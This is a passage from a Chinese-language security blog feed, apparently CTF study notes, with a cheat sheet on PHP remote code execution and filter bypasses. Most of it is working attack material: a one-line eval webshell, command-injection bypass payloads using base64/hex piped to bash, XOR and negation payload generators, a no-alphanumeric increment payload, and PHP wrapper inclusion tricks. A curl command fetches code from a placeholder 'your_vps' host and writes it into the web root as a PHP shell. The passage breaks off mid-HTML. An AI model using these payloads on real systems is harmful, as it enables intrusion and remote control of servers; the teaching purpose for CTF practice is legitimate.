id="ReflectionMethod-获取注释内容"><a class="header-anchor" href="#ReflectionMethod-获取注释内容">¶</a>ReflectionMethod - 获取注释内容</h2><p>适用于 PHP 5 &gt;= 5.1.0, PHP 7, PHP 8<code>ReflectionFunction</code> 类的 <code>getDocComment()</code> 方法可以获取注释内容</p>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
            <tag> PHP </tag>
            
            <tag> 强比较 </tag>
            
            <tag> 弱比较 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE</title>
      <link href="/article/rce/"/>
      <url>/article/rce/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>RCE简介</h1><h2 id="利用方向"><a class="header-anchor" href="#利用方向">¶</a>利用方向</h2><ul><li>继承服务器权限读写文件/执行系统命令</li><li>反弹shell</li></ul><h2 id="利用场景"><a class="header-anchor" href="#利用场景">¶</a>利用场景</h2><ul><li>ping</li><li>DNS请求</li><li>Office文档</li><li>框架漏洞</li><li>逻辑漏洞</li></ul><h2 id="前置知识"><a class="header-anchor" href="#前置知识">¶</a>前置知识</h2><h3 id="管道符"><a class="header-anchor" href="#管道符">¶</a>管道符</h3><table><thead><tr><th>管道符</th><th>描述</th></tr></thead><tbody><tr><td>;</td><td>AB都执行</td></tr><tr><td>&amp;</td><td>AB都执行</td></tr><tr><td>&amp;&amp;</td><td>A为真时执行B</td></tr><tr><td>|</td><td>显示B执行结果</td></tr><tr><td>||</td><td>A为假时执行B,否则只执行A</td></tr></tbody></table><h3 id="可利用函数"><a class="header-anchor" href="#可利用函数">¶</a>可利用函数</h3><table><thead><tr><th>函数</th><th>使用例</th></tr></thead><tbody><tr><td>preg_replace()</td><td><code>Preg_replace(&quot;/(.*)/e&quot;,'\\1',$_GET['a']);</code><br /><code>Preg_replace(&quot;/\[(.*)\]/e&quot;,'\\1',$_GET['a']);</code><br />传入a=phpinfo()</td></tr><tr><td>assert()</td><td><code>assert($_GET['a']);</code></td></tr><tr><td>eval()</td><td><code>eval($_GET['a']);</code></td></tr><tr><td>call_user_func()</td><td><code>call_user_func($_GET['a'],$_GET['b']);</code></td></tr><tr><td>$a($b)</td><td>前system后ls</td></tr><tr><td>system</td><td>ls,whomai,cat…</td></tr><tr><td>exec</td><td>无回显,和echo等同时用,与system相同</td></tr><tr><td>shell_exec</td><td>同上</td></tr><tr><td>passthru</td><td>同system</td></tr><tr><td>popen</td><td><code>popen(&quot;whoami &gt;&gt; 1.txt&quot;.'r');</code></td></tr><tr><td>反引号</td><td>echo `whoami`</td></tr></tbody></table><h3 id="可能用到的"><a class="header-anchor" href="#可能用到的">¶</a>可能用到的</h3><p>可能的命令</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一句话木马</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="comment">// 当前位置</span></span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// 尝试读文件</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;c:\windows\system32\drivers\etc\hosts&#x27;</span>));</span><br><span class="line"><span class="comment">// 写马</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;php phpinfo();?&gt;&quot;</span> &gt; phpinfo.php</span><br><span class="line"><span class="comment">// 查看文件</span></span><br><span class="line">type c:\windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><p>可能的例子</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果源码:</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="number">1</span>],<span class="variable">$_POST</span>[<span class="number">2</span>]));</span><br><span class="line"><span class="comment">// 尝试写shell</span></span><br><span class="line"><span class="number">1</span>=shell.php&amp;<span class="number">2</span>=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>()<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="RCE相关漏洞"><a class="header-anchor" href="#RCE相关漏洞">¶</a>RCE相关漏洞</h2><p>Spring WebFlow 远程代码执行(CVE-2017-4971)</p><p>S2-053 远程代码执行</p><h1>绕过</h1><h2 id="过滤字符"><a class="header-anchor" href="#过滤字符">¶</a>过滤字符</h2><h3 id="过滤空格"><a class="header-anchor" href="#过滤空格">¶</a>过滤空格</h3><p>代替空格:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">%20(空格)</span><br><span class="line">%09(tab)</span><br><span class="line">$IFS$9</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS</span><br><span class="line">&#123;cat,/flag&#125;(这是可以用的吗?)</span><br></pre></td></tr></table></figure><h3 id="过滤下划线"><a class="header-anchor" href="#过滤下划线">¶</a>过滤下划线</h3><p>下划线<code>_</code>被过滤，如果是再php8以下，变量名中的第一个非法字符<code>[</code>会被替换为下划线<code>_</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N[S.S等效于N_S.S</span><br><span class="line">php需要接收e_v.a.l参数,给e[v.a.l传参即可</span><br></pre></td></tr></table></figure><h3 id="过滤部分符号"><a class="header-anchor" href="#过滤部分符号">¶</a>过滤部分符号</h3><p>不需要引号也可以利用GET/POST传参, 甚至过滤数字/左尖括号/小括号/等号/冒号都能用这个; 直接变为文件包含</p><p>其实就是将闭合语句, 文件包含和php伪协议结合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 读文件</span><br><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line"># 写文件, 过滤就用base64编码</span><br><span class="line">?c=include$_GET[&quot;a&quot;]?&gt;&amp;a=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line"># 甚至包含日志</span><br><span class="line">?c=include$_GET[&quot;a&quot;]?&gt;&amp;a=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><h3 id="特殊情况"><a class="header-anchor" href="#特殊情况">¶</a>特殊情况</h3><ol><li>过滤<code>=</code>的时候, <code>a=1</code>中这个等号是传参作用而不是字符, 不会被过滤</li><li>正则表达式里面是中文符号</li></ol><h2 id="过滤字符串"><a class="header-anchor" href="#过滤字符串">¶</a>过滤字符串</h2><h3 id="反斜杠绕过"><a class="header-anchor" href="#反斜杠绕过">¶</a>反斜杠绕过</h3><p>主要是应对对预过滤关键词, 在关键词中插入反斜杠即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">c\at /flag</span><br><span class="line">l\s /</span><br></pre></td></tr></table></figure><h3 id="拼接绕过"><a class="header-anchor" href="#拼接绕过">¶</a>拼接绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /flag</span><br><span class="line"># 变为</span><br><span class="line">b=ag;cat /fl\$b</span><br></pre></td></tr></table></figure><h3 id="引号绕过"><a class="header-anchor" href="#引号绕过">¶</a>引号绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//如cat、ls被过滤</span></span><br><span class="line">ca<span class="string">&quot;&quot;</span>t /flag</span><br><span class="line">l<span class="string">&#x27;s&#x27;</span> /</span><br></pre></td></tr></table></figure><h3 id="通配符绕过"><a class="header-anchor" href="#通配符绕过">¶</a>通配符绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//如flag被过滤</span></span><br><span class="line">cat /f???</span><br><span class="line">cat /fl*</span><br><span class="line">cat /f[a-z]&#123;<span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="编码绕过"><a class="header-anchor" href="#编码绕过">¶</a>编码绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//base64编码绕过,编码cat /flag，反引号、| bash、$()用于执行系统命令</span></span><br><span class="line">`<span class="keyword">echo</span> Y2F0IC9mbGFn | base64 -d`</span><br><span class="line"><span class="keyword">echo</span> Y2F0IC9mbGFn | base64 -d | bash</span><br><span class="line">$(<span class="keyword">echo</span> Y2F0IC9mbGFn | base64 -d)</span><br><span class="line"> </span><br><span class="line"><span class="comment">//hex编码绕过，编码cat /flag,| bash用于执行系统命令</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;636174202f666c6167&#x27;</span> | xxd -r -p | bash</span><br><span class="line"> </span><br><span class="line"><span class="comment">//shellcode编码</span></span><br><span class="line"><span class="comment">//十六进制编码</span></span><br></pre></td></tr></table></figure><h3 id="反引号绕过"><a class="header-anchor" href="#反引号绕过">¶</a>反引号绕过</h3><p>反引号里面的东西会被当作命令执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 等效于打开ls目录下的文件</span></span><br><span class="line">cat `ls`</span><br></pre></td></tr></table></figure><h3 id="取反绕过"><a class="header-anchor" href="#取反绕过">¶</a>取反绕过</h3><p>有更为完善的脚本, 只展示原理</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//取反传参</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//输出得到取反传参内容</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;?cmd=(~&quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;)(~&quot;</span>.<span class="variable">$d</span>.<span class="string">&quot;);&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="异或绕过"><a class="header-anchor" href="#异或绕过">¶</a>异或绕过</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 异或构造Python脚本</span></span><br><span class="line">valid = <span class="string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span></span><br><span class="line"> </span><br><span class="line">answer = <span class="built_in">input</span>(<span class="string">&#x27;输入异或构造的字符串:&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">tmp1, tmp2 = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> valid:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> valid:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(c):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;&quot;<span class="subst">&#123;tmp1&#125;</span>&quot;^&quot;<span class="subst">&#123;tmp2&#125;</span>&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="管道符绕过"><a class="header-anchor" href="#管道符绕过">¶</a>管道符绕过</h3><p>比如剩下了<code>|</code>, 可以写个程序绕过;</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义要构造的字符串</span></span><br><span class="line">str1 = [<span class="string">&quot;system&quot;</span>, <span class="string">&quot;cat flag.php&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有效字符直接定义为字符串</span></span><br><span class="line">valid_chars = <span class="string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz^+~$[]&#123;&#125;&amp;-&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> target <span class="keyword">in</span> str1:</span><br><span class="line">    t1, t2 = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> target:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> valid_chars:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> valid_chars:</span><br><span class="line">                hex_i = urllib.parse.quote(i)</span><br><span class="line">                hex_j = urllib.parse.quote(j)</span><br><span class="line">                <span class="comment"># 使用按位或运算符构造字符</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(urllib.parse.unquote(hex_i)) | <span class="built_in">ord</span>(urllib.parse.unquote(hex_j))) == k:</span><br><span class="line">                    t1 += hex_i</span><br><span class="line">                    t2 += hex_j</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;(\&quot;<span class="subst">&#123;t1&#125;</span>\&quot;|\&quot;<span class="subst">&#123;t2&#125;</span>\&quot;)&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="更换函数绕过"><a class="header-anchor" href="#更换函数绕过">¶</a>更换函数绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 我在最前面写了可利用函数都算</span></span><br><span class="line">system -&gt; passthru</span><br><span class="line"><span class="comment"># 读取根目录</span></span><br><span class="line">c=<span class="keyword">eval</span>(<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>)););</span><br><span class="line"><span class="comment"># 读文件</span></span><br><span class="line">c=<span class="keyword">eval</span>(<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])););&amp;a=/flag</span><br><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">readfile</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="comment"># 一行一行读取</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line"><span class="comment"># 一行一个一个字符取</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line"><span class="comment"># 一行一行读取</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">var_dump</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line"><span class="comment"># 文件包含加伪协议</span></span><br></pre></td></tr></table></figure><h3 id="cat替换"><a class="header-anchor" href="#cat替换">¶</a>cat替换</h3><p>这个单独拿出来讲, 因为确实多</p><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>tac</td><td>与cat相反,按行反向输出</td></tr><tr><td>more</td><td>按页显示,用于文件内容多且不能滚动屏幕</td></tr><tr><td>less</td><td>和more类似</td></tr><tr><td>tail</td><td>查看文件末几行</td></tr><tr><td>head</td><td>查看文件首几行</td></tr><tr><td>nl</td><td>cat加上行号</td></tr><tr><td>od</td><td>二进制方式读文件</td></tr><tr><td>xxd</td><td>二进制方式读文件,同时由可读字符显示</td></tr><tr><td>sort</td><td>排序文件</td></tr><tr><td>uniq</td><td>报告或删除文件的重复行</td></tr><tr><td>file -f</td><td>报错文件内容</td></tr><tr><td>grep</td><td>过滤查找字符串</td></tr></tbody></table><blockquote><p>附</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">od</span> -A d -c /flag转入可读字符</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">grep flag /flag查找字符串</span></span><br></pre></td></tr></table></figure></blockquote><h3 id="闭合语句绕过"><a class="header-anchor" href="#闭合语句绕过">¶</a>闭合语句绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// php标签闭合绕过</span></span><br><span class="line"><span class="comment">// 如果还需要在该程序内, 利用;等闭合即可</span></span><br><span class="line"><span class="meta">?&gt;</span> <span class="meta">&lt;?=</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span> <span class="meta">&lt;?</span></span><br></pre></td></tr></table></figure><h3 id="回溯过限绕过"><a class="header-anchor" href="#回溯过限绕过">¶</a>回溯过限绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// php正则回溯次数大于1000000次返回False</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello world&#x27;</span>+<span class="string">&#x27;h&#x27;</span>^<span class="number">1000000</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/hello.*world/is&quot;</span>,<span class="variable">$a</span>) == False</span><br></pre></td></tr></table></figure><h2 id="无回显"><a class="header-anchor" href="#无回显">¶</a>无回显</h2><p>函数执行结果无回显, 可以外带/写文件/反弹shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">// 无回显RCE，如exec()函数，可将执行结果输出到文件再访问文件</span><br><span class="line">ls / | tee 1.txt</span><br><span class="line">cat /flag | tee 2.txt</span><br><span class="line">eval(print`c\at /flag`;)</span><br></pre></td></tr></table></figure><h2 id="限定后缀-限定部分命令"><a class="header-anchor" href="#限定后缀-限定部分命令">¶</a>限定后缀/限定部分命令</h2><p>限定后缀名, 一般是<code>%00</code>截断, 闭合或者是注释掉后面的内容</p><p>限定部分命令:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以利用换行符, 管道符等让其不执行或输出后执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=cat flag.php || # 理论上 ;, |, ||, &amp;, &amp;&amp;都可以用</span><br><span class="line">?c=cat flag.php%0a</span><br></pre></td></tr></table></figure><h2 id="函数处理"><a class="header-anchor" href="#函数处理">¶</a>函数处理</h2><p>输入会经过一些函数的处理, 使得直接构造无效化</p><ol><li><code>ob_get_contents()</code>函数</li></ol><p>在前面虽然有命令执行, 如果我用这个函数获取缓冲区内容, 将所有字符替换为问号呢(此时输出全是问号)</p><p>首先可以利用<code>exit();</code>截断</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);exit(0);</span><br><span class="line">c=var_export(scandir(&quot;/&quot;));exit();# 根目录</span><br></pre></td></tr></table></figure><p>还可以反向操作:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c5ec61c2-5fd3-4973-8277-71d0522d966d.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">d = &#123;<span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;include(&quot;/flag.txt&quot;);echo ~ob_get_contents();&#x27;</span>&#125;</span><br><span class="line">s = requests.post(url, d).content</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(~i &amp; <span class="number">0xff</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="无权限"><a class="header-anchor" href="#无权限">¶</a>无权限</h2><p>设置<code>open_basedir()</code>, 限制<code>ini_set()</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="极端情况"><a class="header-anchor" href="#极端情况">¶</a>极端情况</h2><h3 id="无参数绕过"><a class="header-anchor" href="#无参数绕过">¶</a>无参数绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getallheaders()、get_defined_vars()、session_id</span><br></pre></td></tr></table></figure><h3 id="自增绕过"><a class="header-anchor" href="#自增绕过">¶</a>自增绕过</h3><p>无字母无数字</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//自增payload，assert($_POST[_]),命令传入_</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=<span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);&amp;_=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><h3 id="临时文件绕过"><a class="header-anchor" href="#临时文件绕过">¶</a>临时文件绕过</h3><p>原理:Linux主要存储在 /tmp/ 目录下, 格式通常是 /tmp/php[ 6个随机字符 ]Windows主要存储在 C:/Windows/ 目录下，格式通常是 C:/Windows/php[ 4个随机字符 ].tmp</p><p>在自己的服务器上写一个命令执行的 txt ,然后整到靶机上</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://your_vps/1.txt &gt; /var/www/html/1.php</span><br></pre></td></tr></table></figure><p>然后尝试访问</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`/??p/p?p??????`;</span><br></pre></td></tr></table></figure><p>还有一种更极端的: 没有上传点, 但是也有解决方法, 只要是PHP网站都可以用上传(默认行为), 可以自己构造上传界面</p><blockquote><p>相关题目为ctfshow web55</p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span 